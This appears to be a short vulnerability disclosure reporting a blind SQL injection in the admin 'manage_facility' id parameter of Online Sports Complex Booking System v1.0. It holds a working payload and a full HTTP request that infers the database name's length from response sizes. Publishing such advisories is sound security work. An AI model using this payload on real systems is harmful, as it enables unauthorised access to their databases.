# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File:  /scbs/admin/?page=facilities/manage_facility&id=

Vulnerability location:  /scbs/admin/?page=facilities/manage_facility&id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/?page=facilities/manage_facility&id=3%27%20and%20length(database())%20=7--+

```sql
GET /scbs/admin/?page=facilities/manage_facility&id=3%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 25373
![image](https://user-images.githubusercontent.com/54017627/165217195-f00eb048-50a5-4b66-8c51-e8d11607a8fc.png)

![image](https://user-images.githubusercontent.com/54017627/165217156-6b1dc30f-74e6-40ce-9c0e-eb96da79aac7.png)


When length (database ()) = 7, Content-Length: 28378
![image](https://user-images.githubusercontent.com/54017627/165217229-702cc81a-2aa1-4914-8376-7ad060cd3f59.png)

![image](https://user-images.githubusercontent.com/54017627/165217110-e4a304d4-2caa-4ae3-ae59-4de21eb64c71.png)

